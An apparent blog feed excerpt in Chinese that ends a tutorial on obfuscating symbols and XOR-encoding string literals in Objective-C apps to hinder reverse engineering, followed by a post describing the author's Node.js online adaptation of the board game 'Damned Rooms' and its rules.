</pre></td><td class='code'><pre><code class='bash'><span class='line'>void func1<span class="o">()</span> SYMBOL<span class="o">(</span>_func1<span class="o">)</span><span class="p">;</span>    <span class="o">==</span>&gt;   void func1<span class="o">()</span><span class="p">;</span>
</span><span class='line'>           <span class="o">||</span>               不混淆时的展开
</span><span class='line'>          <span class="se">\|</span><span class="p">|</span>/ SYMBOL宏展开
</span><span class='line'>           <span class="se">\/</span>
</span><span class='line'>void func1<span class="o">()</span> asm<span class="o">(</span>_func1<span class="o">)</span><span class="p">;</span>
</span><span class='line'>           <span class="o">||</span>
</span><span class='line'>          <span class="se">\|</span><span class="p">|</span>/ _func1宏展开
</span><span class='line'>           <span class="se">\/</span>
</span><span class='line'>void func1<span class="o">()</span> asm<span class="o">(</span><span class="s2">&quot;UvftVFTxsweCSElpqLPmjiMJIb&quot;</span><span class="o">)</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p><code>asm label</code>的语法解释，可以参考gcc的<a href="https://gcc.gnu.org/onlinedocs/gcc/Asm-Labels.html">onlinedocs</a></p>

<h3>字符串混淆</h3>

<p>字符串也是逆向分析的一大切入点，可以根据目标字符串快速定位目标代码，有针对性地进行调试、分析。在binary中隐藏字符串可以有效提升静态分析的难度，因此需要在源代码中将字符串进行加密，运行时先解密后再使用。但如果在源代码中直接写加密后的字符串，代码的可读性就会变得非常差。</p>

<p>但字符串无法像标识符那样，在预编译阶段直接通过几个宏就替换为加密的形式。我想了一个不是很优雅，但是很有效的方法：</p>

<ol>
<li>将源代码中的字符串通过函数宏手动标记</li>
<li>备份源代码</li>
<li>将源代码中所有标记过的字符串，替换成<code>decrypt("密文")</code>的形式</li>
<li>在适当的位置，插入<code>decrypt</code>函数的实现(或者事先在源代码中写好)</li>
<li>编译</li>
<li>还原备份的源代码</li>
</ol>


<p>示例，混淆这份代码中的字符串</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='objective-c'><span class='line'><span class="cp">#import &lt;Foundation/Foundation.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#ifndef STRING_OBFUSCATE</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#define NSSTRING(string) @string</span>
</span><span class='line'><span class="cp">#define CSTRING(string) string</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#endif</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">NSLog</span><span class="p">(</span><span class="s">@&quot;%@&quot;</span><span class="p">,</span> <span class="n">NSSTRING</span><span class="p">(</span><span class="s">&quot;Hello, world!&quot;</span><span class="p">));</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">CSTRING</span><span class="p">(</span><span class="s">&quot;Hello, world!&quot;</span><span class="p">));</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>反编译的结果</p>

<p><img src="http://xelz.info/assets/2016/origin_disassemble.png" alt="" /></p>

<p><img src="http://xelz.info/assets/2016/origin_cstring.png" alt="" /></p>

<p>字符串混淆脚本，字符串加密选用简单的抑或，仅为示例</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/env python</span>
</span><span class='line'><span class="c"># -*- coding: utf-8 -*-</span>
</span><span class='line'><span class="c"># 本脚本用于对源代码中的字符串进行加密</span>
</span><span class='line'><span class="c"># 1. 在源代码中插入解密函数decryptConstString</span>
</span><span class='line'><span class="c"># 2. 插入宏，替换所有的NSSTRING(...)和CSTRING(...)为decryptConstString(encrypted_string)</span>
</span><span class='line'><span class="c"># 3. 替换所有字符串常量为加密的char数组，形式((char[]){1, 2, 3, 0})</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">re</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">os</span>
</span><span class='line'>
</span><span class='line'><span class="c"># 插入宏和解密函数，解密方法：每个字节与0xAA异或</span>
</span><span class='line'><span class="n">insert_code</span> <span class="o">=</span> <span class="s">&#39;&#39;&#39;#define STRING_OBFUSCATE</span>
</span><span class='line'>
</span><span class='line'><span class="s">static char* decryptConstString(char* string) __attribute__((always_inline));</span>
</span><span class='line'>
</span><span class='line'><span class="s">#define NSSTRING(string) [NSString stringWithUTF8String:decryptConstString(string)]</span>
</span><span class='line'><span class="s">#define CSTRING(string) decryptConstString(string)</span>
</span><span class='line'>
</span><span class='line'><span class="s">static char* decryptConstString(char* string)</span>
</span><span class='line'><span class="s">{</span>
</span><span class='line'><span class="s">    char* origin_string = string;</span>
</span><span class='line'><span class="s">    while(*string) {</span>
</span><span class='line'><span class="s">        *string ^= 0xAA;</span>
</span><span class='line'><span class="s">        string++;</span>
</span><span class='line'><span class="s">    }</span>
</span><span class='line'><span class="s">    return origin_string;</span>
</span><span class='line'><span class="s">}</span>
</span><span class='line'>
</span><span class='line'><span class="s">#ifndef STRING_OBFUSCATE&#39;&#39;&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># 替换字符串为((char[]){1, 2, 3, 0})的形式，同时让每个字节与0xAA异或进行加密</span>
</span><span class='line'><span class="k">def</span> <span class="nf">replace</span><span class="p">(</span><span class="n">match</span><span class="p">):</span>
</span><span class='line'>    <span class="c"># print match.group()</span>
</span><span class='line'>    <span class="n">string</span> <span class="o">=</span> <span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\x00</span><span class="s">&#39;</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">replaced_string</span> <span class="o">=</span> <span class="s">&#39;((char []) {&#39;</span> <span class="o">+</span> <span class="s">&#39;, &#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="s">&quot;</span><span class="si">%i</span><span class="s">&quot;</span> <span class="o">%</span> <span class="p">((</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0xAA</span><span class="p">)</span> <span class="k">if</span> <span class="n">c</span> <span class="o">!=</span> <span class="s">&#39;</span><span class="se">\0</span><span class="s">&#39;</span> <span class="k">else</span> <span class="mi">0</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">list</span><span class="p">(</span><span class="n">string</span><span class="p">)])</span> <span class="o">+</span> <span class="s">&#39;})&#39;</span>
</span><span class='line'>    <span class="c"># print replaced_string</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">replaced_string</span> <span class="o">+</span> <span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># 修改源代码，加入字符串加密的函数</span>
</span><span class='line'><span class="k">def</span> <span class="nf">obfuscate</span><span class="p">(</span><span class="nb">file</span><span class="p">):</span>
</span><span class='line'>    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="nb">file</span><span class="p">,</span> <span class="s">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span><span class='line'>        <span class="n">code</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span><span class='line'>        <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>        <span class="n">code</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="s">r&#39;(NSSTRING\(|CSTRING\()&quot;(.*?)&quot;(\))&#39;</span><span class="p">,</span> <span class="n">replace</span><span class="p">,</span> <span class="n">code</span><span class="p">)</span>
</span><span class='line'>        <span class="n">code</span> <span class="o">=</span> <span class="n">code</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">&#39;#ifndef STRING_OBFUSCATE&#39;</span><span class="p">,</span> <span class="n">insert_code</span><span class="p">)</span>
</span><span class='line'>        <span class="c"># print code</span>
</span><span class='line'>        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="nb">file</span><span class="p">,</span> <span class="s">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span><span class='line'>            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">code</span><span class="p">)</span>
</span><span class='line'>            <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
</span><span class='line'>    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">2</span> <span class="ow">and</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]):</span>
</span><span class='line'>        <span class="n">obfuscate</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
</span><span class='line'>    <span class="k">else</span><span class="p">:</span>
</span><span class='line'>        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>执行字符串混淆脚本，源代码变为：</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class='objective-c'><span class='line'><span class="cp">#import &lt;Foundation/Foundation.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#define STRING_OBFUSCATE</span>
</span><span class='line'>
</span><span class='line'><span class="k">static</span> <span class="kt">char</span><span class="o">*</span> <span class="nf">decryptConstString</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">string</span><span class="p">)</span> <span class="n">__attribute__</span><span class="p">((</span><span class="n">always_inline</span><span class="p">));</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#define NSSTRING(string) [NSString stringWithUTF8String:decryptConstString(string)]</span>
</span><span class='line'><span class="cp">#define CSTRING(string) decryptConstString(string)</span>
</span><span class='line'>
</span><span class='line'><span class="k">static</span> <span class="kt">char</span><span class="o">*</span> <span class="nf">decryptConstString</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">string</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="kt">char</span><span class="o">*</span> <span class="n">origin_string</span> <span class="o">=</span> <span class="n">string</span><span class="p">;</span>
</span><span class='line'>    <span class="k">while</span><span class="p">(</span><span class="o">*</span><span class="n">string</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="o">*</span><span class="n">string</span> <span class="o">^=</span> <span class="mh">0xAA</span><span class="p">;</span>
</span><span class='line'>        <span class="n">string</span><span class="o">++</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">origin_string</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#ifndef STRING_OBFUSCATE</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#define NSSTRING(string) @string</span>
</span><span class='line'><span class="cp">#define CSTRING(string) string</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#endif</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">NSLog</span><span class="p">(</span><span class="s">@&quot;%@&quot;</span><span class="p">,</span> <span class="n">NSSTRING</span><span class="p">(((</span><span class="kt">char</span> <span class="p">[])</span> <span class="p">{</span><span class="mi">226</span><span class="p">,</span> <span class="mi">207</span><span class="p">,</span> <span class="mi">198</span><span class="p">,</span> <span class="mi">198</span><span class="p">,</span> <span class="mi">197</span><span class="p">,</span> <span class="mi">134</span><span class="p">,</span> <span class="mi">138</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">197</span><span class="p">,</span> <span class="mi">216</span><span class="p">,</span> <span class="mi">198</span><span class="p">,</span> <span class="mi">206</span><span class="p">,</span> <span class="mi">139</span><span class="p">,</span> <span class="mi">0</span><span class="p">})));</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">CSTRING</span><span class="p">(((</span><span class="kt">char</span> <span class="p">[])</span> <span class="p">{</span><span class="mi">226</span><span class="p">,</span> <span class="mi">207</span><span class="p">,</span> <span class="mi">198</span><span class="p">,</span> <span class="mi">198</span><span class="p">,</span> <span class="mi">197</span><span class="p">,</span> <span class="mi">134</span><span class="p">,</span> <span class="mi">138</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span> <span class="mi">197</span><span class="p">,</span> <span class="mi">216</span><span class="p">,</span> <span class="mi">198</span><span class="p">,</span> <span class="mi">206</span><span class="p">,</span> <span class="mi">139</span><span class="p">,</span> <span class="mi">0</span><span class="p">})));</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>测试一下效果</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='objective-c'><span class='line'><span class="err">$</span> <span class="n">python</span> <span class="n">obfuscate</span><span class="p">.</span><span class="n">py</span> <span class="n">string</span><span class="p">.</span><span class="n">m</span>
</span><span class='line'><span class="err">$</span> <span class="n">clang</span> <span class="n">string</span><span class="p">.</span><span class="n">m</span> <span class="o">-</span><span class="n">framework</span> <span class="n">Foundation</span>
</span><span class='line'><span class="err">$</span> <span class="p">.</span><span class="o">/</span><span class="n">a</span><span class="p">.</span><span class="n">out</span>
</span><span class='line'><span class="mi">2017</span><span class="o">-</span><span class="mo">01</span><span class="o">-</span><span class="mo">01</span> <span class="mi">19</span><span class="o">:</span><span class="mi">34</span><span class="o">:</span><span class="mf">17.144</span> <span class="n">a</span><span class="p">.</span><span class="n">out</span><span class="p">[</span><span class="mi">3563</span><span class="o">:</span><span class="mi">143969</span><span class="p">]</span> <span class="n">Hello</span><span class="p">,</span> <span class="n">world</span><span class="o">!</span>
</span><span class='line'><span class="n">Hello</span><span class="p">,</span> <span class="n">world</span><span class="o">!</span>
</span></code></pre></td></tr></table></div></figure>


<p>反编译一下，已经隐藏了字符串特征</p>

<p><img src="http://xelz.info/assets/2016/disassemble.png" alt="" /></p>

<p><code>__cstring</code>中也看不到原始的字符串，连混淆后的字符串也看不到</p>

<p><img src="http://xelz.info/assets/2016/cstring.png" alt="" /></p>

<p>说明：</p>

<p>如果把字符串<code>"Hello"</code>转化为<code>char[]{'H','e','l','l','o'，0}</code>的形式进行编译，字符串就会从<code>__cstring</code>中的明文字符，变为<code>__text</code>中的一段代码，可以防止被搜索到。因此如果要兼顾执行效率和混淆的效果，只需要把字符串转换成char数组的形式就可以了，不需要再添加解密的步骤。</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Damned Rooms]]></title>
    <link href="http://xelz.info/blog/2015/10/30/damned-rooms/"/>
    <updated>2015-10-30T18:00:00+08:00</updated>
    <id>http://xelz.info/blog/2015/10/30/damned-rooms</id>
    <content type="html"><![CDATA[<h2>游戏名称</h2>

<p><strong>密室惊魂Online</strong></p>

<h2>项目说明</h2>

<p>这个桌游是一个曾经开桌游店的同事送的，觉得这个游戏很有意思，但是一般需要5-8人，线下组局太难了。加入官方QQ群之后发现大家会在QQ群里通过建讨论组的方式来在线组局。此种方式需要一个MC主持游戏，每个人的选择和行动都是私聊给MC，MC通过PS软件绘制游戏地图，并通过各种图层来控制元素的堆放和移动，然后截图发在讨论组里。不禁感慨玩家的智慧是多么的强大。</p>

<p>后来我就在想，何不用程序来代替MC和PS呢？于是这个项目就诞生了。</p>

<p><strong>托管地址</strong>：<a href="https://github.com/xelzmm/danmned">https://github.com/xelzmm/danmned</a></p>

<p><strong>开发语言</strong>：nodejs</p>

<p><strong>相关技术</strong>：ejs, websocket, css3</p>

<p><strong>游戏截图</strong></p>

<p><img src="http://xelz.info/assets/2015/damned.png" alt="教学界面" /></p>

<h2>游戏介绍</h2>

<p>密室惊魂是一款运用语言和推理逻辑，结合区域行动策略的版图桌面游戏。
游戏讲述一群中毒的受害者被奸徒困在一个完美密室里，大家需要在有限的时间内互相交流合作，寻找线索破解迷题，最终突破奸徒的阻挠找到出口逃生。该款游戏的特色是将玩家的语言交流和实际行动相结合，是一个考验玩家之间合作和显示玩家智慧的新型语言推理类桌面游戏。</p>

<p><strong>游戏人数</strong>： 5到9人，已支持3-4人的mini模式</p>

<p><strong>游戏时长</strong>： 约60至90分钟</p>

<p><strong>游戏类型</strong>： 语言推理类</p>

<!-- more -->


<p><strong>网杀地址</strong>： <a href="http://msjh.aliapp.com/">http://msjh.aliapp.com/</a> (已失效)   <a href="http://msjh.shinemarketing.cn">http://msjh.shinemarketing.cn</a></p>

<p><strong>游戏Ｑ群</strong>：205189960 <a href="http://shang.qq.com/wpa/qunwpa?idkey=5c2b3d7e0616c2711001a6e8ab9661d9b0d6ae321169afb09e4fa0b38911e7ce"><img src="http://pub.idqqimg.com/wpa/images/group.png" alt="密室惊魂" /></a> (约战，问询，交流)</p>

<h2>主要特色</h2>

<ul>
<li>使用文字输入来表述自己。</li>
<li>使用自己专属的线索列表。</li>
<li>标记出已监控线索的玩家状态。</li>
<li>电脑当MC，全自动随机地图身份线索，智能移动路径提示。</li>
<li>可以将游戏中的玩家的精彩对局记录下来。</li>
<li>惊心动魄的密室文字冒险。</li>
</ul>


<h2>游戏说明</h2>

<h3>准备进入游戏</h3>

<ul>
<li>进入游戏首页，并设定昵称。</li>
<li>首次进入游戏首页，或者直接进入游戏，会强制要求设定昵称。</li>
<li>昵称可在游戏首页进行修改</li>
<li>创建游戏，或者直接加入已有游戏房间</li>
<li>直接复制已创建好的房间URL即可直接进入游戏</li>
<li>也可直接进入已有游戏观战（第三人称视角）</li>
<li>进入游戏后可以聊天、切换准备状态</li>
<li>当玩家数量>=3，且全部准备就绪，游戏将自动开始</li>
</ul>


<h3>游戏规则</h3>

<ul>
<li>按照《密室惊魂》大屋标准版规则执行</li>
<li>每局游戏地图完全<code>随机</code>，安全房间只有一个(1号-12号房间内随机)</li>
<li><code>受害者</code>目标：解除身上的剧毒，并通过获取线索找出安全房间逃生

<ul>
<li><code>逃生</code>定义：最后一回合时，已解毒，并处于安全房间内</li>
<li><code>受害者总人数-2</code>完成逃生，即视作受害者团体胜利</li>
</ul>
</li>
<li><code>奸徒</code>目标：阻止受害者逃生，受害者失败即为奸徒胜利

<ul>
<li>奸徒不需要<code>逃生</code>，逃生与否，不影响奸徒胜利</li>
</ul>
</li>
<li><code>EX受害者</code>目标：与受害者一起逃生或者单独逃生

<ul>
<li>首先EX是受害者的一员，受害者胜利EX同样胜利</li>
<li>其次，EX可以单独逃生，即当<code>只有</code>EX逃生时，EX单独胜利</li>
<li>EX单独胜利，代表奸徒(若有)胜利，受害者失败</li>
</ul>
</li>
<li><code>SP暗警</code>目标：解除身上的剧毒，并通过获取线索找出安全房间逃生

<ul>
<li>SP暗警属于普通受害者的一员</li>
<li>SP暗警可以在拆弹时进行伏击(出<code>破坏</code>卡)，如若此做

<ul>
<li>若有奸徒选择破坏，则伏击成功，炸弹直接被解除，游戏增加一回合</li>
<li>若无奸徒破坏，则因暗警失误造成拆弹失败</li>
</ul>
</li>
</ul>
</li>
<li>一定几率出现<code>EX受害者</code>/<code>SP暗警</code>/<code>奸徒</code>，人数越多几率越大</li>
<li>扩展规则</li>
<li>6人局增加<code>13号房间危险</code>一级线索卡，用于增加难度</li>
<li>7人局增加<code>大厅危险</code>一级线索卡，用于增加难度</li>
<li>8人局增加大厅<code>毒雾</code>功能，用于增加难度</li>
<li>9人局增加<code>黑色房间危险</code>二级线索卡，用于增加难度</li>
<li>增加的线索卡无线索意义，但可以用于升级、降级、销毁</li>
</ul>


<h4>发言阶段</h4>

<ul>
<li>按照<code>密室法则</code>依次发言</li>
<li>每个玩家限时第一回合<code>70秒</code>，后续每回合<code>增加10秒</code></li>
<li>发言期间，超过<code>15秒</code>无任何输入动作将自动超时结束</li>
<li>不是自己的发言时间，禁止发言，但可以打字，提前准备发言内容</li>
<li>玩家在此阶段可以作<code>任意发言</code></li>
<li>输入指令<code>/xs</code>可以输出自己的线索标记状态</li>
<li>发言中包含<code>over</code>字样，或者提交<code>空发言</code>，将提前结束发言</li>
<li>满足钥匙<code>索要</code>或者<code>赠予</code>条件(自己没有/有钥匙，同房间内有其他有/没有钥匙的玩家)，可在此阶段发动</li>
<li>发言按钮旁边会出现<code>索要/赠予</code>按钮</li>
<li>发动后将会在<code>自己发言完毕时</code>询问目标玩家是否同意/接受</li>
<li>目标玩家回应限时<code>15秒</code>，超时自动拒绝(索要)/接受(赠予)</li>
<li>满足抢钥匙条件(同一房间玩家数>=3，且至少一人有钥匙)，没有钥匙的玩家可在此阶段发动抢钥匙</li>
<li>发言按钮旁边会出现<code>抢钥匙</code>的按钮</li>
<li>发动抢钥匙，则会在<code>当前房间内所有玩家</code>都发言完毕后进行<code>投票</code></li>
<li>若存在两把以上的钥匙，先投票决定抢<code>谁</code>的钥匙，再投票<code>抢钥匙</code></li>
<li>投票限时<code>15秒</code>，超时自动<code>弃权</code></li>
<li>投票结束后会公布投票情况，并决定钥匙归属</li>
<li>投票结果出现平票或者全部弃权，钥匙保留在原玩家身上</li>
<li>如其他玩家说出线索卡内容，可自行<code>点击线索区域</code>进行标记</li>
</ul>


<h4>移动阶段</h4>

<ul>
<li>按照<code>密室法则</code>依次移动，每个玩家限时<code>30秒</code></li>
<li>每次移动，可以走1-2步

<ul>
<li>进入相邻房间为1步，进入对角房间视为2步</li>
</ul>
</li>
<li>不是自己的移动时间，无法移动</li>
<li>超时将<code>自动移动</code>，在满足规则前提下完全随机(不会上锁)</li>
<li>轮到玩家移动时，<code>点击要去的房间</code>，自动计算可选路径及<code>上锁/解锁</code>方案</li>
<li>在<code>有钥匙</code>的前提下</li>
<li>离开有解锁标记的房间，可以回头上锁</li>
<li>进入有解锁标记的房间，可以将该房间上锁</li>
<li>进入有上锁标记的房间，必须将该房间解锁</li>
<li>停留在有上锁标记的房间，可以将该房间解锁</li>
<li>途径的房间无法上锁/解锁</li>
<li>一次移动过程中最多使用一次钥匙</li>
<li>密室中任意时刻最多只能有3个房间被锁上</li>
<li>在允许停留的情况下，<code>点击自己所在房间</code>，可以<code>停留</code></li>
<li>大厅允许无条件停留</li>
<li>逃生前一回合允许无条件停留</li>
<li>在已上锁的房间内允许无条件停留</li>
<li>在周围房间都已上锁的房间内允许无条件停留</li>
<li>在已上锁的房间内允许解锁后停留(需有钥匙)</li>
<li>在有锁但未上锁的房间内，可以上锁后停留(需有钥匙)</li>
<li>除了以上允许停留的情况外，此阶段<code>必须移动</code>，不得停留在原房间</li>
</ul>


<h4>时间阶段</h4>

<ul>
<li>时间标记增加一回合</li>
<li>如果到达第8回合(未成功拆弹两次)或者第9回合(已成功拆弹两次)，则进行游戏结算，公布<code>玩家身份</code>及<code>安全房间</code>，游戏结束</li>
</ul>


<h4>执行阶段</h4>

<ul>
<li>按顺序依次执行房间功能</li>
<li>按照房间号码 0(大厅)、1、2&hellip;12的顺序依次执行每个房间的功能</li>
<li>每个房间内按照<code>密室法则</code>，决定房间功能执行者，并执行房间功能</li>
<li><code>密室法则</code>：每个房间内，只有<code>一个人</code>可以执行房间功能</li>
<li>【L】代表房间内号码最大的玩家获得执行权</li>
<li>【S】代表房间内号码最小的玩家获得执行权</li>
<li>如遇以下几种情况，<code>让过</code>执行权给房间内下一位玩家(若有)</li>
<li>玩家在解毒房间，但已经解毒</li>
<li>玩家在线索房间，已经持有线索卡，并且选择不销毁线索卡</li>
<li>玩家在升级/降级房间，但是没有线索卡，或者没有可与其合成的方案</li>
<li>如遇以下几种情况，<code>跳过</code>房间功能执行</li>
<li>玩家在监视房间，但是没有人可被监视</li>
<li>玩家在线索房间，但是线索卡区域已经没有1级线索卡</li>
<li>玩家在小号的拆弹房间，但是炸弹已经解除或者控制器已经被破坏</li>
<li>玩家在大号的拆弹房间</li>
<li>如房间内有<code>钥匙</code>，则按照房间L/S属性，没有钥匙的最大/小号玩家获得钥匙</li>
<li><code>行动</code>：拆弹/升级/降级</li>
<li>限时<code>15秒</code></li>
<li>分别询问参与行动的玩家<code>配合</code>还是<code>破坏</code></li>
<li>至少有1人<code>破坏</code>，则行动失败

<ul>
<li> 特殊情况，拆弹时，如有两个<code>破坏</code>，即<code>奸徒</code>与<code>SP暗警</code>都<code>破坏</code>，视作<code>SP暗警</code>破坏了<code>奸徒</code>的行动，炸弹直接被解除，游戏增加一回合</li>
</ul>
</li>
<li>房间功能，以下省略的主语均代指<code>获得房间功能执行权的玩家</code></li>
<li><code>大厅</code>

<ul>
<li>大厅必定是危险房间，没有任何功能</li>
<li>8人局以上，大厅增加功能<code>毒雾</code></li>
<li>停留在大厅的玩家将会<code>中毒</code>，<code>经过</code>毒雾大厅，不会中毒</li>
<li>对尚未解毒的玩家没有任何影响</li>
<li>中毒后，玩家棋子由<code>绿色</code>变为<code>红色</code></li>
<li><code>毒雾</code>会在第6回合发言阶段之前散去，停留不再中毒</li>
</ul>
</li>
<li><code>治疗</code>房间

<ul>
<li>进行<code>解毒</code>(逃生的必要条件)</li>
<li>解毒后，玩家棋子由<code>红色</code>变为<code>绿色</code></li>
</ul>
</li>
<li><code>线索</code>房间

<ul>
<li>没有线索卡则获得一张<code>【1】级线索卡</code>，获得后，自动标记线索区</li>
<li>有线索卡则可选择是否<code>销毁线索卡</code>(销毁后不能立刻获得新的线索卡)</li>
<li>任何时间一名玩家只能持有<code>一张线索卡</code>(无论等级)</li>
</ul>
</li>
<li><code>监视</code>房间

<ul>
<li>查看任意一名<code>不在监视房</code>的玩家手中的线索卡</li>
<li>查看后，自动标记自己的线索区</li>
<li>无法查看在<code>任意监视房</code>内的其他玩家的线索卡</li>
</ul>
</li>
<li><code>升级</code>房间 / <code>降级</code> 房间

<ul>
